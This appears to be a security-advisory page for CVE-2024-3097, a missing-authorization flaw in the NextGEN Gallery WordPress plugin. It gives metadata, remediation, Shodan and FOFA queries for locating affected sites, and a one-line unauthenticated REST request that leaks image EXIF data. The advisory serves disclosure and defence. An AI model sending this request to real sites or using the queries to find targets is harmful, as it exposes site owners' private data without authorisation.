---
layout: post
cve_id: CVE-2024-3097
title: NextGEN Gallery <= 3.59 - Missing Authorization to Unauthenticated Information
  Disclosure
pcap: true
pcap_path: /pcaps/2024/CVE-2024-3097.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-3097.yaml
snort2_rule: N/A
snort3_rule: N/A
author: DhiyanesDK
severity: medium
impact: 'Unauthenticated attackers can perform unauthorized actions within the NextGEN
  Gallery plugin.

  '
remediation: 'Update NextGEN Gallery to version 3.60 or later.

  '
reference:
- https://plugins.trac.wordpress.org/browser/nextgen-gallery/trunk/src/REST/Admin/Block.php#L40
- https://www.wordfence.com/threat-intel/vulnerabilities/id/75f87f99-9f0d-46c2-a6f1-3c1ea0176303?source=cve
- https://zpbrent.github.io/pocs/8-plugin-nextgen-gallery-InfoDis-20240327.mp4
- https://github.com/fkie-cad/nvd-json-data-feeds
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
  cvss-score: 5.3
  cve-id: CVE-2024-3097
  cwe-id: CWE-862
  epss-score: 0.27418
  epss-percentile: 0.96248
  cpe: cpe:2.3:a:imagely:nextgen_gallery:*:*:*:*:*:wordpress:*:*
metadata:
  max-request: 1
  vendor: imagely
  product: nextgen_gallery
  framework: wordpress
  shodan-query:
  - cpe:"cpe:2.3:a:imagely:nextgen_gallery"
  - http.html:/wp-content/plugins/nextgen-gallery/
  fofa-query: body=/wp-content/plugins/nextgen-gallery/
  publicwww-query: /wp-content/plugins/nextgen-gallery/
tags:
- cve
- cve2024
- wordpress
- nextgen-gallery
- wp-plugin
- info-leak
- imagely
- vuln
---

## ðŸ” Vulnerability Description
The WordPress Gallery Plugin â€“ NextGEN Gallery plugin for WordPress is vulnerable to unauthorized access of data due to a missing capability check on the get_item function in versions up to, and including, 3.59. This makes it possible for unauthenticated attackers to extract sensitive data including EXIF and other metadata of any image uploaded through the plugin.


## ðŸŒ HTTP Request
```nohighlight
GET /wp-json/ngg/v1/admin/block/image/1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

